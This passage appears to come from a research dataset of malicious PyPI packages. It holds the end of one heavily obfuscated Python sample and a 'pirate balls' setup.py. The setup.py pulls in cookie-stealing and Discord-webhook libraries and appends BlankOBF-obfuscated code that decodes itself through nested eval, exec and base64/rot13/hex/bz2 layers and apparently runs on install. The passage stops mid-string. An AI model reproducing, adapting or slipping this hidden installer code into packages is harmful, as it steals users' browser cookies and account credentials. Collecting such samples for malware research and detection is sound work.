\\x4f\\\\116\\\\130\\\\170\\\\60\\\\152\\\\x46\\\\x30\\\\x53\\\\x47\\\\105\\\\167\\\\x6b\\\\107\\\\105\\\\x30\\\\110\\\\145\\\\126\\\\167\\\\x4d\\\\x71\\\\110\\\\155\\\\x31\\\\x70\\\\113\\\\x46\\\\x49\\\\x5a\\\\130\\\\106\\\\x38\\\\71\\\\x47\\\\x52\\\\161\\\\x49\\\\132\\\\106\\\\x4c\\\\62\\\\112\\\\x52\\\\x48\\\\x35\\\\x42\\\\166\\\\x35\\\\126\\\\x48\\\\106\\\\x35\\\\x49\\\\106\\\\61\\\\x4c\\\\130\\\\x47\\\\x47\\\\x6b\\\\104\\\\x56\\\\111\\\\165\\\\x59\\\\x43\\\\110\\\\x41\\\\105\\\\104\\\\107\\\\126\\\\x61\\\\x41\\\\170\\\\122\\\\153\\\\x56\\\\x52\\\\x5a\\\\x66\\\\x58\\\\60\\\\x44\\\\x2b\\\\x46\\\\x30\\\\160\\\\x39\\\\x42\\\\154\\\\60\\\\x2f\\\\105\\\\61\\\\x71\\\\161\\\\x41\\\\x79\\\\61\\\\120\\\\101\\\\171\\\\61\\\\104\\\\x58\\\\155\\\\x53\\\\120\\\\103\\\\x52\\\\x4f\\\\x4e\\\\x44\\\\166\\\\142\\\\154\\\\111\\\\122\\\\143\\\\x43\\\\x45\\\\60\\\\x48\\\\141\\\\x48\\\\x50\\\\x31\\\\104\\\\104\\\\x46\\\\122\\\\x66\\\\105\\\\122\\\\x6b\\\\x52\\\\101\\\\x6a\\\\x63\\\\x41\\\\x58\\\\x48\\\\x5a\\\\x65\\\\130\\\\x46\\\\x48\\\\150\\\\x5a\\\\154\\\\x6a\\\\164\\\\x59\\\\x49\\\\x45\\\\x55\\\\126\\\\x50\\\\x4e\\\\x35\\\\102\\\\155\\\\x5a\\\\146\\\\113\\\\120\\\\116\\\\142\\\\126\\\\120\\\\101\\\\156\\\\113\\\\x49\\\\105\\\\x73\\\\x49\\\\x51\\\\x35\\\\x70\\\\113\\\\x76\\\\111\\\\x55\\\\102\\\\x6c\\\\142\\\\x6d\\\\104\\\\x6c\\\\160\\\\65\\\\x57\\\\106\\\\115\\\\113\\\\104\\\\x46\\\\x78\\\\x6b\\\\x41\\\\x46\\\\60\\\\x37\\\\110\\\\x78\\\\170\\\\x65\\\\132\\\\60\\\\64\\\\142\\\\103\\\\x48\\\\x34\\\\143\\\\x4a\\\\x50\\\\x71\\\\113\\\\x50\\\\170\\\\61\\\\x4d\\\\103\\\\122\\\\x5a\\\\70\\\\102\\\\x77\\\\127\\\\107\\\\x59\\\\121\\\\126\\\\62\\\\x4b\\\\x52\\\\x67\\\\x48\\\\x58\\\\x30\\\\x70\\\\166\\\\x4b\\\\x6d\\\\x5a\\\\170\\\\x49\\\\171\\\\161\\\\x70\\\\104\\\\x78\\\\165\\\\x45\\\\x41\\\\x50\\\\x45\\\\122\\\\x4b\\\\154\\\\x57\\\\x46\\\\102\\\\110\\\\104\\\\x2b\\\\x58\\\\x6c\\\\101\\\\x4f\\\\x44\\\\122\\\\122\\\\141\\\\x58\\\\x46\\\\146\\\\x31\\\\107\\\\x52\\\\x35\\\\x55\\\\112\\\\x6c\\\\x72')\",\"\",_____.__name__));__________________=_____(_______(\"\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\56\\144\\145\\143\\x6f\\x64\\145(b'\\\\67\\\\70\\\\x34\\\\67\\\\65\\\\x30\\\\x36\\\\x39\\\\x36\\\\143\\\\x34\\\\144\\\\65\\\\70\\\\66\\\\x39\\\\65\\\\x39\\\\63\\\\x39\\\\64\\\\141\\\\65\\\\63\\\\x34\\\\71\\\\x33\\\\x34\\\\x35\\\\x34\\\\67\\\\71\\\\x34\\\\65\\\\64\\\\142\\\\65\\\\64\\\\65\\\\65\\\\64\\\\x31\\\\63\\\\x38\\\\65\\\\x35\\\\64\\\\66\\\\x33\\\\61\\\\x34\\\\x63\\\\65\\\\66\\\\x34\\\\65\\\\x35\\\\x32\\\\66\\\\x34\\\\65\\\\x35\\\\x35\\\\63\\\\x34\\\\x65\\\\64\\\\x31\\\\65\\\\x37\\\\x35\\\\64\\\\x34\\\\x32\\\\x34\\\\145\\\\x35\\\\64\\\\66\\\\142\\\\65\\\\x35\\\\x33\\\\70\\\\x34\\\\x63\\\\x37\\\\x61\\\\x36\\\\x66\\\\x37\\\\60\\\\65\\\\x33\\\\63\\\\60\\\\65\\\\x39\\\\x33\\\\65\\\\x35\\\\x31\\\\x35\\\\x35\\\\65\\\\x32\\\\x35\\\\x34\\\\x34\\\\144\\\\x35\\\\x35\\\\63\\\\64\\\\x36\\\\x66\\\\x35\\\\x33\\\\x36\\\\141\\\\x33\\\\x38\\\\67\\\\65\\\\x35\\\\x33\\\\x37\\\\71\\\\x36\\\\63\\\\63\\\\x37\\\\x34\\\\x63\\\\x35\\\\66\\\\66\\\\x62\\\\x36\\\\x64\\\\x34\\\\71\\\\x35\\\\x33\\\\65\\\\x39\\\\x33\\\\61\\\\64\\\\141\\\\64\\\\63\\\\x33\\\\x38\\\\67\\\\x38\\\\x35\\\\x33\\\\67\\\\x39\\\\x33\\\\70\\\\63\\\\x32\\\\64\\\\x39\\\\x34\\\\65\\\\x37\\\\60\\\\x35\\\\66\\\\x35\\\\x38\\\\x35\\\\x33\\\\x36\\\\70\\\\64\\\\x61\\\\x35\\\\x30\\\\x34\\\\x36\\\\65\\\\x32\\\\x35\\\\67\\\\65\\\\70\\\\x34\\\\x34\\\\x34\\\\144\\\\x33\\\\71\\\\x34\\\\144\\\\65\\\\61\\\\x37\\\\60\\\\x34\\\\x65\\\\x34\\\\x64\\\\65\\\\x36\\\\x36\\\\x38\\\\64\\\\66\\\\x35\\\\64\\\\x33\\\\x30\\\\x35\\\\61\\\\63\\\\67\\\\64\\\\x62\\\\x33\\\\x31\\\\x35\\\\x35\\\\66\\\\70\\\\x35\\\\65\\\\64\\\\x34\\\\66\\\\x63\\\\64\\\\x34\\\\64\\\\x63\\\\x33\\\\x31\\\\66\\\\63\\\\67\\\\60\\\\x34\\\\142\\\\x35\\\\x33\\\\64\\\\x39\\\\x33\\\\63\\\\x34\\\\x61\\\\65\\\\66\\\\64\\\\145\\\\65\\\\x31\\\\x35\\\\63\\\\x36\\\\x62\\\\67\\\\x38\\\\x35\\\\x37\\\\x34\\\\143\\\\66\\\\x39\\\\63\\\\65\\\\64\\\\x38\\\\64\\\\143\\\\64\\\\x36\\\\x33\\\\60\\\\x36\\\\141\\\\x34\\\\142\\\\x35\\\\65\\\\65\\\\x31\\\\x37\\\\60\\\\x34\\\\71\\\\x37\\\\71\\\\64\\\\62\\\\x35\\\\61\\\\64\\\\142\\\\65\\\\63\\\\x35\\\\141\\\\66\\\\x32\\\\x35\\\\x33\\\\x33\\\\60\\\\x33\\\\x35\\\\x34\\\\x31\\\\65\\\\x31\\\\x33\\\\61\\\\x36\\\\70\\\\64\\\\71\\\\x35\\\\x34\\\\x35\\\\63\\\\65\\\\66\\\\65\\\\62\\\\65\\\\66\\\\63\\\\61\\\\64\\\\x36\\\\65\\\\65\\\\65\\\\70\\\\65\\\\x33\\\\65\\\\62\\\\x34\\\\71\\\\65\\\\x35\\\\x35\\\\x33\\\\x36\\\\x34\\\\64\\\\67\\\\65\\\\66\\\\x37\\\\x39\\\\x35\\\\x31\\\\x37\\\\61\\\\x34\\\\63\\\\66\\\\142\\\\63\\\\61\\\\x36\\\\61\\\\x35\\\\x34\\\\x35\\\\x36\\\\x33\\\\x38\\\\63\\\\x37\\\\x35\\\\x32\\\\65\\\\63\\\\x36\\\\x34\\\\64\\\\66\\\\65\\\\x30\\\\x33\\\\60\\\\65\\\\71\\\\x37\\\\65\\\\x35\\\\62\\\\x36\\\\142\\\\x35\\\\x39\\\\x37\\\\x32\\\\x35\\\\x30\\\\66\\\\x62\\\\63\\\\60\\\\x37\\\\x30\\\\x34\\\\145\\\\x37\\\\141\\\\64\\\\61\\\\66\\\\x62\\\\64\\\\71\\\\67\\\\71\\\\x37\\\\x37\\\\x36\\\\141\\\\x34\\\\x64\\\\x33\\\\x31\\\\64\\\\145\\\\x34\\\\x63\\\\x35\\\\66\\\\x33\\\\x30\\\\64\\\\144\\\\62\\\\142\\\\65\\\\64\\\\x35\\\\64\\\\x34\\\\65\\\\67\\\\x39\\\\x34\\\\141\\\\65\\\\x35\\\\x33\\\\x39\\\\x34\\\\x38\\\\x34\\\\146\\\\x35\\\\63\\\\66\\\\67\\\\67\\\\x37\\\\x35\\\\x36\\\\x35\\\\x35\\\\x35\\\\65\\\\67\\\\x33\\\\x35\\\\x35\\\\66\\\\x63\\\\67\\\\67\\\\67\\\\x31\\\\x35\\\\x34\\\\64\\\\x33\\\\x37\\\\x33\\\\x37\\\\61\\\\65\\\\70\\\\x35\\\\x33\\\\67\\\\60\\\\65\\\\70\\\\65\\\\x37\\\\64\\\\64\\\\67\\\\x38\\\\65\\\\63\\\\64\\\\x64\\\\66\\\\x63\\\\x35\\\\x32\\\\64\\\\x36\\\\65\\\\x30\\\\x34\\\\x34\\\\65\\\\x39\\\\x33\\\\x39\\\\x35\\\\x34\\\\65\\\\x34\\\\63\\\\60\\\\x34\\\\142\\\\65\\\\64\\\\65\\\\x35\\\\x34\\\\71\\\\x37\\\\71\\\\65\\\\x36\\\\x36\\\\x39\\\\64\\\\145\\\\x34\\\\66\\\\x35\\\\x35\\\\66\\\\141\\\\x34\\\\71\\\\x36\\\\x64\\\\x34\\\\x63\\\\65\\\\63\\\\64\\\\x36\\\\64\\\\63\\\\x34\\\\143\\\\64\\\\64\\\\66\\\\64\\\\64\\\\x35\\\\65\\\\x34\\\\64\\\\x34\\\\63\\\\x30\\\\63\\\\64\\\\x35\\\\x36\\\\63\\\\x30\\\\x36\\\\70\\\\x34\\\\145\\\\x34\\\\x64\\\\x33\\\\x31\\\\x36\\\\67\\\\x37\\\\x39\\\\64\\\\x39\\\\65\\\\x33\\\\66\\\\142\\\\63\\\\65\\\\x34\\\\x63\\\\64\\\\65\\\\64\\\\145\\\\66\\\\x36\\\\x34\\\\146\\\\x36\\\\142\\\\x35\\\\x36\\\\65\\\\x34\\\\x35\\\\65\\\\x36\\\\x63\\\\x34\\\\x61\\\\64\\\\64\\\\65\\\\x33\\\\x37\\\\141\\\\63\\\\61\\\\64\\\\x33\\\\64\\\\145\\\\x35\\\\66\\\\67\\\\x33\\\\63\\\\70\\\\65\\\\x34\\\\65\\\\65\\\\x33\\\\x34\\\\66\\\\142\\\\x34\\\\x61\\\\65\\\\66\\\\x34\\\\65\\\\x33\\\\64\\\\x35\\\\66\\\\65\\\\63\\\\x37\\\\x38\\\\65\\\\x37\\\\x35\\\\61\\\\x36\\\\x39\\\\67\\\\x34\\\\x35\\\\x37\\\\x35\\\\x37\\\\x34\\\\66\\\\63\\\\x30\\\\67\\\\x39\\\\64\\\\x65\\\\x37\\\\141\\\\63\\\\61\\\\x36\\\\x36\\\\64\\\\x62\\\\64\\\\x31\\\\x37\\\\x30\\\\x34\\\\145\\\\x34\\\\143\\\\x33\\\\x31\\\\63\\\\x31\\\\64\\\\64\\\\65\\\\x35\\\\67\\\\71\\\\x34\\\\61\\\\x37\\\\x30\\\\64\\\\141\\\\66\\\\141\\\\x34\\\\x36\\\\64\\\\x35\\\\65\\\\x32\\\\65\\\\66\\\\67\\\\63\\\\x37\\\\x33\\\\x34\\\\71\\\\x34\\\\x35\\\\64\\\\65\\\\67\\\\141\\\\x35\\\\63\\\\x35\\\\63\\\\x37\\\\64\\\\65\\\\x35\\\\65\\\\65\\\\64\\\\x34\\\\x34\\\\x61\\\\64\\\\x36\\\\x35\\\\61\\\\64\\\\64\\\\64\\\\71\\\\x36\\\\145\\\\65\\\\70\\\\64\\\\x36\\\\x33\\\\71\\\\x34\\\\61\\\\x35\\\\x32\\\\x34\\\\66\\\\x34\\\\x39\\\\x37\\\\63\\\\65\\\\62\\\\x33\\\\61\\\\66\\\\64\\\\x35\\\\64\\\\65\\\\x33\\\\66\\\\x61\\\\66\\\\x62\\\\67\\\\x37\\\\x35\\\\62\\\\65\\\\x35\\\\66\\\\142\\\\67\\\\71\\\\64\\\\142\\\\x33\\\\x31\\\\x37\\\\x33\\\\x36\\\\x61\\\\64\\\\141\\\\x34\\\\65\\\\65\\\\61\\\\62\\\\146\\\\x35\\\\x31\\\\64\\\\x36\\\\x34\\\\65\\\\62\\\\x66\\\\x35\\\\x35\\\\64\\\\x36\\\\x37\\\\x30\\\\x35\\\\x39\\\\x35\\\\66\\\\65\\\\x36\\\\x34\\\\65\\\\66\\\\67\\\\65\\\\x35\\\\x34\\\\64\\\\65\\\\71\\\\66\\\\x37\\\\64\\\\x63\\\\x33\\\\60\\\\63\\\\x35\\\\64\\\\71\\\\x34\\\\x33\\\\x36\\\\x62\\\\x33\\\\x31\\\\x36\\\\62\\\\x35\\\\x34\\\\67\\\\71\\\\64\\\\141\\\\65\\\\x32\\\\x34\\\\x65\\\\66\\\\71\\\\66\\\\x38\\\\x34\\\\63\\\\65\\\\x32\\\\x34\\\\63\\\\64\\\\141\\\\x34\\\\x32\\\\x35\\\\x30\\\\x33\\\\x30\\\\x34\\\\x32\\\\66\\\\63\\\\65\\\\x34\\\\x34\\\\65\\\\x35\\\\x35\\\\67\\\\x33\\\\64\\\\x65\\\\x36\\\\141\\\\x33\\\\61\\\\150')\",\"\",_____.__name__));______________=_____(_______(\"\\137\\137\\137\\137\\137\\x5f\\x5f\\137\\x5f\\137\\x5f\\56\\144\\145\\143\\157\\x64\\x65(b'\\\\x62\\\\x65\\\\147\\\\151\\\\156\\\\x20\\\\66\\\\66\\\\x36\\\\x20\\\\74\\\\144\\\\x61\\\\164\\\\x61\\\\76\\\\12\\\\x4d\\\\66\\\\x36\\\\125\\\\66\\\\x3b\\\\106\\\\45\\\\67\\\\55\\\\46\\\\x3d\\\\x2e\\\\72\\\\105\\\\x44\\\\122\\\\62\\\\64\\\\x31\\\\x58\\\\72\\\\125\\\\105\\\\x38\\\\x34\\\\x46\\\\101\\\\x30\\\\x39\\\\127\\\\41\\\\x2e\\\\x33\\\\x34\\\\65\\\\x36\\\\x32\\\\105\\\\55\\\\43\\\\55\\\\47\\\\111\\\\52\\\\64\\\\x54\\\\64\\\\x52\\\\63\\\\x36\\\\x49\\\\113\\\\x3e\\\\x44\\\\x59\\\\x4a\\\\64\\\\x44\\\\x45\\\\x29\\\\x0a\\\\x4d\\\\x3e\\\\x44\\\\x49\\\\104\\\\65\\\\x34\\\\x2d\\\\41\\\\71\\\\125\\\\51\\\\x4b\\\\54\\\\65\\\\x21\\\\61\\\\60\\\\126\\\\x31\\\\x46\\\\x35\\\\43\\\\x25\\\\114\\\\71\\\\x45\\\\x41\\\\x49\\\\x30\\\\66\\\\x41\\\\x2a\\\\x2c\\\\67\\\\x3d\\\\x48\\\\66\\\\x23\\\\x20\\\\x59\\\\64\\\\x25\\\\41\\\\x33\\\\x2e\\\\64\\\\131\\\\x2f\\\\x3a\\\\126\\\\x31\\\\65\\\\x32\\\\x34\\\\x31\\\\41\\\\55\\\\44\\\\x45\\\\65\\\\12\\\\115\\\\54\\\\x27\\\\75\\\\51\\\\x31\\\\105\\\\x45\\\\x58\\\\63\\\\x36\\\\121\\\\x57\\\\x3c\\\\44\\\\x4d\\\\x33\\\\64\\\\x36\\\\101\\\\43\\\\x3a\\\\x53\\\\41\\\\x53\\\\x34\\\\x46\\\\x4d\\\\62\\\\x39\\\\44\\\\115\\\\x35\\\\x3e\\\\44\\\\111\\\\67\\\\x35\\\\44\\\\x39\\\\101\\\\64\\\\65\\\\x35\\\\x2d\\\\76\\\\x44\\\\131\\\\63\\\\x2e\\\\65\\\\71\\\\x2d\\\\x2c\\\\x35\\\\x25\\\\132\\\\x33\\\\x56\\\\x4d\\\\55\\\\x0a\\\\115\\\\x3a\\\\x34\\\\x45\\\\x35\\\\x30\\\\x45\\\\71\\\\51\\\\61\\\\x26\\\\x4d\\\\x54\\\\x32\\\\x35\\\\x35\\\\114\\\\62\\\\104\\\\105\\\\132\\\\61\\\\67\\\\61\\\\x2c\\\\61\\\\66\\\\x51\\\\45\\\\64\\\\x34\\\\x39\\\\x29\\\\71\\\\x54\\\\x45\\\\43\\\\x30\\\\x45\\\\65\\\\x29\\\\x30\\\\x54\\\\x25\\\\x47\\\\x32\\\\64\\\\55\\\\41\\\\x3a\\\\64\\\\125\\\\132\\\\x34\\\\67\\\\105\\\\x2c\\\\64\\\\x55\\\\44\\\\126\\\\12\\\\x4d\\\\64\\\\66\\\\x49\\\\46\\\\61\\\\x34\\\\x49\\\\113\\\\x36\\\\64\\\\115\\\\64\\\\65\\\\44\\\\x55\\\\127\\\\x32\\\\x46\\\\105\\\\x25\\\\x3d\\\\x24\\\\x45\\\\x26\\\\62\\\\66\\\\111\\\\x2f\\\\x3a\\\\x54\\\\x55\\\\x4b\\\\62\\\\x46\\\\111\\\\46\\\\x32\\\\105\\\\55\\\\65\\\\63\\\\104\\\\x3d\\\\51\\\\x34\\\\x57\\\\x3d\\\\132\\\\63\\\\x34\\\\61\\\\x47\\\\x3e\\\\104\\\\115\\\\x35\\\\x34\\\\x45\\\\x2d\\\\57\\\\x0a\\\\x4d\\\\x34\\\\x55\\\\105\\\\113\\\\x35\\\\64\\\\61\\\\x2d\\\\76\\\\104\\\\x55\\\\131\\\\x3a\\\\x25\\\\x29\\\\54\\\\60\\\\x54\\\\45\\\\x57\\\\x35\\\\64\\\\55\\\\x31\\\\x3e\\\\44\\\\125\\\\46\\\\64\\\\x33\\\\71\\\\x2c\\\\65\\\\66\\\\x4d\\\\x54\\\\62\\\\64\\\\55\\\\55\\\\x3e\\\\104\\\\105\\\\x33\\\\60\\\\105\\\\65\\\\x2f\\\\x34\\\\125\\\\x45\\\\127\\\\x34\\\\x26\\\\115\\\\x4c\\\\61\\\\x35\\\\x35\\\\127\\\\x0a\\\\115\\\\x3c\\\\x24\\\\x59\\\\x2e\\\\x31\\\\104\\\\45\\\\130\\\\64\\\\104\\\\71\\\\51\\\\x3d\\\\44\\\\x51\\\\114\\\\x2c\\\\x35\\\\111\\\\x38\\\\x35\\\\x45\\\\111\\\\43\\\\x34\\\\x46\\\\x4d\\\\x3a\\\\61\\\\124\\\\x45\\\\x25\\\\56\\\\x35\\\\41\\\\56\\\\x35\\\\45\\\\x29\\\\x26\\\\65\\\\x45\\\\61\\\\62\\\\x32\\\\104\\\\115\\\\x4b\\\\62\\\\x36\\\\121\\\\x2b\\\\x31\\\\x37\\\\101\\\\53\\\\x32\\\\x56\\\\x45\\\\x54\\\\12\\\\x4d\\\\x33\\\\125\\\\65\\\\113\\\\x30\\\\63\\\\x25\\\\x2a\\\\x3a\\\\67\\\\54\\\\126\\\\63\\\\x23\\\\41\\\\104\\\\62\\\\124\\\\x49\\\\114\\\\x2e\\\\65\\\\x29\\\\x2d\\\\x3a\\\\126\\\\115\\\\x56\\\\x36\\\\x26\\\\x49\\\\52\\\\61\\\\x54\\\\125\\\\x35\\\\61\\\\104\\\\x41\\\\60\\\\x2c\\\\45\\\\104\\\\126\\\\65\\\\x44\\\\61\\\\103\\\\x3e\\\\44\\\\x2d\\\\113\\\\x2c\\\\x23\\\\x35\\\\x2f\\\\61\\\\x26\\\\135\\\\x47\\\\12\\\\x4d\\\\x32\\\\106\\\\x51\\\\x22\\\\64\\\\x35\\\\x38\\\\x50\\\\x3a\\\\44\\\\115\\\\x2c\\\\x3b\\\\x23\\\\41\\\\130\\\\x32\\\\x54\\\\55\\\\46\\\\62\\\\x24\\\\131\\\\63\\\\x3e\\\\45\\\\51\\\\x32\\\\61\\\\x35\\\\x25\\\\116\\\\x34\\\\x36\\\\x51\\\\x53\\\\x3c\\\\105\\\\x25\\\\x4a\\\\x32\\\\67\\\\x3d\\\\x34\\\\65\\\\x44\\\\x45\\\\115\\\\x33\\\\x35\\\\65\\\\45\\\\72\\\\105\\\\55\\\\x24\\\\62\\\\63\\\\41\\\\56\\\\12\\\\115\\\\65\\\\x24\\\\44\\\\126\\\\63\\\\125\\\\x39\\\\56\\\\x35\\\\x35\\\\x21\\\\x25\\\\x3b\\\\x24\\\\x31\\\\x30\\\\x35\\\\67\\\\55\\\\x49\\\\65\\\\x24\\\\61\\\\55\\\\x3a\\\\104\\\\x55\\\\x49\\\\71\\\\123\\\\x29\\\\67\\\\x31\\\\66\\\\x41\\\\x31\\\\x33\\\\x54\\\\71\\\\x25\\\\x32\\\\125\\\\61\\\\x36\\\\70\\\\x57\\\\x21\\\\x35\\\\x2c\\\\65\\\\x49\\\\72\\\\x32\\\\66\\\\105\\\\45\\\\75\\\\x55\\\\x2d\\\\45\\\\12\\\\47\\\\65\\\\66\\\\x51\\\\x2c\\\\72\\\\x35\\\\x29\\\\x2d\\\\63\\\\x30\\\\40\\\\x20\\\\x0a\\\\x20\\\\x0a\\\\x65\\\\x6e\\\\144\\\\12\\\\x75')\",\"\",_____.__name__));_______________=_____(_______(\"\\163\\164\\162\\x2e\\x6a\\157\\x69\\156('', \\x5b\\137\\x5f\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x28\\x78\\x29\\x20\\x66\\x6f\\162\\x20\\x78\\40\\151\\156\\x20\\x5b\\137\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\x5f\\137\\54\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\x2c\\137\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\137\\x5f\\137\\x5f\\x2c\\137\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\135\\135)\",\"\", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), \"\\x75\\165\"),\"\\142\\172\\x32\"),____________________)[_____(\"\\106\\x61\\154\\163\\145\")])"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-12-pirate-balls",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='pirate balls', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\x65\\166\\x61\\154\");_______=_____(\"\\143\\157\\155\\160\\151\\x6c\\x65\");______,____=_____(_______(\"\\x5f\\137\\x69\\x6d\\160\\157\\162\\x74\\137\\x5f\\50\\47\\x62\\x61\\x73\\145\\x36\\64\\x27\\x29\",\"\",_____.__name__)),_____(_______(\"\\x5f\\x5f\\x69\\x6d\\x70\\157\\162\\x74\\x5f\\137\\50\\47\\143\\157\\144\\145\\143\\163\\47\\x29\",\"\",_____.__name__));____________________=_____(\"'\\x20\\x32\\x52\\104\\x68'\");________,_________,__________,___________=_____(_______(\"\\145\\170\\145\\143\",\"\",_____.__name__)),_____(_______(\"\\x73\\164\\162\\56\\145\\x6e\\143\\157\\144\\x65\",\"\",_____.__name__)),_____(_______(\"\\x69\\x73\\151\\x6e\\163\\x74\\141\\x6e\\143\\145\",\"\",_____.__name__)),_____(_______(\"\\142\\171\\x74\\145\\x73\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\x20\":\n        ___________=\"\\x20\"+___________\n    for _ in range(_____(\"\\x6c\\145\\x6e\\50\\x5f\\137\\x5f\\137\\137\\x5f\\137\\x5f\\137\\137\\51\")):\n        _________+=_____(\"\\143\\x68\\162\\x28\\157\\x72\\144\\x28\\x5f\\137\\137\\x5f\\137\\x5f\\137\\137\\137\\137\\133\\x5f\\x5d\\x29\\136\\157\\162\\x64\\50\\x5f\\137\\x5f\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\133\\50\\x6c\\145\\x6e\\x28\\x5f\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x29\\40\\55\\40\\x54\\162\\165\\145\\52\\62\\x29\\x20\\x2b\\x20\\124\\x72\\x75\\x65\\x5d\\51\\x29\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\143\\137\\137\\137\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\66\\163\\65\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\66\\x61\\x72\\144\\166\\x38'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = _____(_______(\"\\137\\x5f\\137\\137\\x2e\\144\\145\\143\\x6f\\x64\\x65\\x28\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\x5f\\x5b\\72\\55\\124\\x72\\x75\\145\\x5d,'\\162\\x6f\\164\\61\\x33')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\x66\\x35\\163\\146\\163\\x64\\146\\141\\x75\\x66\\x38\\x35'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\x5f\\137\\x5f\\x2e\\144\\x65\\143\\157\\x64\\x65\\x28\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5b\\72\\x2d\\124\\162\\165\\145\\135,'\\165\\x75')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\x64\\65\\x73\\146\\x73\\61\\x64\\146\\x66\\x68\\x73\\144\\x38'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\137\\x5f\\137\\x5f\\x2e\\x64\\x65\\x63\\x6f\\144\\145\\50\\137\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\133\\x3a\\55\\x54\\x72\\165\\x65\\x5d,'\\x68\\x65\\x78')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\x5f\\137\\x5f\\137\\x5f\\x5f\\56\\x62\\70\\65\\x64\\x65\\143\\x6f\\144\\x65\\x28\\137\\137\\137\\137\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5b\\x3a\\55\\124\\162\\x75\\145\\135\\x29\",\"\",_____.__name__));_____________=_____(_______(\"\\137\\137\\x5f\\137\\x2e\\x64\\145\\x63\\157\\144\\x65\\50\\137\\x5f\\137\\137\\137\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\137, '\\x68\\x65\\x78')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\x5f\\137\\137\\x5f\\137\\137\\137\\137\\137\\x5f\\137\\56\\144\\145\\143\\x6f\\144\\145\\50\\x5f\\137\\137\\137\\x5f\\137\\137\\137\\137\\x5f\\x5f\\137\\137\\51\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\137\\x5f\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\137\\x2e\\x64\\x65\\x63\\x6f\\x64\\x65(b'\\\\x48\\\\x5a\\\\x28\\\\x4d\\\\64\\\\x48\\\\43\\\\x73\\\\166\\\\152\\\\x48\\\\43\\\\111\\\\x62\\\\64\\\\x48\\\\70\\\\156\\\\x49\\\\x63\\\\107\\\\55\\\\x35\\\\122\\\\x7c\\\\x48\\\\145\\\\157\\\\150\\\\156\\\\x47\\\\x26\\\\156\\\\x55\\\\146\\\\x47\\\\x63\\\\131\\\\44\\\\x5a\\\\x47\\\\143\\\\x68\\\\x7a\\\\140\\\\107\\\\x26\\\\104\\\\x43\\\\152\\\\x47\\\\46\\\\156\\\\x55\\\\x66\\\\x48\\\\x23\\\\163\\\\50\\\\x44\\\\110\\\\x65\\\\100\\\\x74\\\\162\\\\x48\\\\70\\\\145\\\\x4a\\\\62\\\\x47\\\\143\\\\53\\\\x7c\\\\x5a\\\\110\\\\70\\\\167\\\\117\\\\x64\\\\x48\\\\x44\\\\116\\\\125\\\\176\\\\110\\\\145\\\\x29\\\\x6e\\\\157\\\\110\\\\x61\\\\x52\\\\163\\\\154\\\\x48\\\\x65\\\\x6f\\\\x62\\\\x6a\\\\107\\\\x26\\\\126\\\\111\\\\x67\\\\110\\\\x38\\\\x65\\\\x4a\\\\x33\\\\107\\\\46\\\\145\\\\x4d\\\\63\\\\x47\\\\46\\\\x33\\\\x5f\\\\146\\\\x47\\\\46\\\\x6e\\\\x53\\\\63\\\\x47\\\\x63\\\\x59\\\\161\\\\x54\\\\x48\\\\141\\\\60\\\\x61\\\\x66\\\\x48\\\\141\\\\122\\\\x77\\\\103\\\\x47\\\\x2d\\\\x35\\\\x53\\\\x30\\\\x48\\\\x38\\\\167\\\\125\\\\153\\\\x48\\\\x23\\\\x6a\\\\166\\\\x6c\\\\x48\\\\70\\\\167\\\\x50\\\\65\\\\x48\\\\x38\\\\x43\\\\x7c\\\\146\\\\110\\\\x23\\\\x73\\\\50\\\\x41\\\\x48\\\\x5a\\\\x28\\\\117\\\\152\\\\110\\\\50\\\\x40\\\\150\\\\64\\\\x48\\\\146\\\\x31\\\\x24\\\\x36\\\\x47\\\\143\\\\131\\\\161\\\\x58\\\\x47\\\\53\\\\x7b\\\\115\\\\60\\\\x47\\\\x26\\\\115\\\\x36\\\\x59\\\\x48\\\\x66\\\\x31\\\\x7a\\\\161\\\\110\\\\70\\\\156\\\\114\\\\